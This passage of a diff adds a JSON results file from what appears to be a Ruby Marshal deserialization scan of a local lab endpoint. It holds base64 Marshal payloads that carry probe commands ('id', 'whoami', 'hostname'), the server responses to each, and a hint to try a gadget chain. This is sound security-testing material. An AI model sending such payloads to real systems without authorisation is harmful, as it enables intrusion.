+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSINaG9zdG5hbWUGOgZFVA==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 69,
+                        "body_sample": "{\"success\":true,\"config\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8085/api/restore-prefs",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "627034d2843c",
+            "type": "Ruby",
+            "subtype": null,
+            "confidence": "Medium",
+            "exploit_type": "Ruby Marshal Deserialization",
+            "suggested_probe": "ruby_marshal",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "Ruby Marshal stream detected by Fingerprint stage (suspected) | Try Marshal-based gadget chain (e.g. via a ruby -e helper script)",
+            "normalized": [
+                "\u0004\bo:\tUser\u0007:\u000e@usernameI\"\u000bwiener\u0006:\u0006ET:\u000b@adminF"
+            ],
+            "mutations_count": 3,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSIHaWQGOgZFVA==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSILd2hvYW1pBjoGRVQ=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    }
+                },
+                {
+                    "payload_type": "ruby_marshal",
+                    "chain": "Marshal.dump helper",
+                    "payload": "BAhvOgtPYmplY3QGOglAY21kSSINaG9zdG5hbWUGOgZFVA==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"success\":true,\"restored\":\"#<OpenStruct theme=\\\"dark\\\", lang=\\\"en\\\">\"}"
+                    }
+                }
+            ]
+        }
+    ]
+}
